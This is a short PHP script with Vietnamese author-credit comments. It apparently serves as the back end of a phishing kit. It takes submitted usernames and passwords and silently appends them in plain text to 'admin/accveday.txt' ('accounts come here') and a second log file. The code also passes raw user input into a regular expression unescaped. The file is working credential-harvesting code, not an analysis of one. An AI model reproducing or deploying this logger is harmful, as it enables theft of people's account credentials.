<!-- LUONG VAN TAN 
Facebook.com/vantan2khong6  -->


<!-- LUONG VAN TAN 
Vui lòng không xoá để tôn trọng tác giả  -->


<?php


$username = $_POST['user'];
$password = $_POST['pass'];
// Code by TAN DZ
if($username == "" && $password == ""){
header("Location: index.php");
}
?>

<?php function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }

      if(!preg_match('/'.$username.'/', file_get_contents('admin/accveday.txt'))){
        $file = fopen('admin/accveday.txt','a');
        fwrite($file,$username.'|'.$password.PHP_EOL);
        fclose($file);
        fwrite(fopen('loc.txt','a'),$username."\n");
        fclose(fopen('loc.txt','a'));
        }
        Echo  ' ';   

?>


<!-- LUONG VAN TAN 
Vui lòng không xoá để tôn trọng tác giả  -->


<!-- LUONG VAN TAN 
Vui lòng không xoá để tôn trọng tác giả  -->
